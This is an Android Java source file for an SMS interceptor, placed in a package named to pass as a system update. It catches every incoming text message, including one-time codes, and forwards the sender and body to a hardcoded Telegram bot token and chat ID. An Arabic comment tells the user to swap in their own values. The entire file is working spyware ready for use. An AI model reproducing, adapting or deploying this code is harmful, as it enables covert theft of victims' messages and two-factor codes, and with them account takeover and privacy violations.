package com.system.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.io.IOException;
import okhttp3.*;

public class SmsReceiver extends BroadcastReceiver {
    // ⚠️ غير البيانات هنا
    private static final String BOT_TOKEN = "9086594295:AAFDb4xNafSILfLpaotY8Mc-XDcO1YjzAzo";
    private static final String CHAT_ID = "6978974735";
    private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";

    private final OkHttpClient client = new OkHttpClient();

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    StringBuilder msg = new StringBuilder("🚨 **رسالة SMS جديدة:**\n");
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        msg.append("**من:** ").append(sms.getOriginatingAddress()).append("\n");
                        msg.append("**النص:** ").append(sms.getMessageBody()).append("\n");
                    }
                    sendTextToTelegram(msg.toString());
                }
            }
        }
    }

    private void sendTextToTelegram(String text) {
        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build();
        Request request = new Request.Builder().url(TG_API + "sendMessage").post(body).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) { }
            @Override public void onResponse(Call call, Response response) { }
        });
    }
}
